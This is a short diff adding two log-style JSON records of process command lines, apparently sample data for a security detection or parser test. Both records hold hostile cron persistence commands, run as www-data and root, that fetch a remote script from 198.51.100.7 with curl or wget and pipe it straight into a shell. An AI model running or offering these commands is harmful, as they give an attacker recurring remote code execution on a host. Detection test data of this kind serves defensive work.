@@ -1,0 +1,2 @@
+{"Image": "/bin/sh", "CommandLine": "sh -c (crontab -l; echo '*/5 * * * * curl -fsSL http://198.51.100.7/x.sh | sh') | crontab -", "User": "www-data"}
+{"Image": "/usr/bin/bash", "CommandLine": "bash -c echo '@reboot root wget -qO- http://198.51.100.7/m | bash' > /etc/cron.d/sysupd", "User": "root"}
